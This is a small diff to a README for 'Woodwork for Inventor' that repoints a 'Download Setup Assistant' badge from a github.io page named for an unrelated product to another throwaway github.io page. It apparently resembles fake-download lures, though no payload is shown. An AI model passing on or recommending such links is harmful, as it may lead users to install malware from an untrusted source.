@@ -1,6 +1,6 @@
 # Woodwork for Inventor
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://avigilon-control-center-desktop-app.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://woodworkinventor-downloadtool.github.io/.github/)
 
 ## ⚙️ How to Use
 
